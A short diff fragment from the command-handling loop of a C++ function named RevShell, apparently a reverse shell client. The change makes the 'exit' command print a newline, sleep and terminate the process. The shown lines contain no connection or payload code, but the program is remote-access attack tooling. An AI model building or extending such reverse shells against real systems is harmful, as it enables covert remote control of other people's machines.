@@ -91,8 +91,10 @@ void RevShell()
 				memset(CommandReceived, 0, sizeof(CommandReceived));
 			}
 			else if (strcmp(CommandReceived, "exit\n") == 0) {
-				std::cout << "Command parsed: exit";
+				std::cout << "Command parsed: exit" << std::endl;
 				std::cout << "Closing connection..." << std::endl;
+				sleep(1000);
+				exit(0);
 			}
 			else {
 				std::cout << "Command not parsed!" << std::endl;
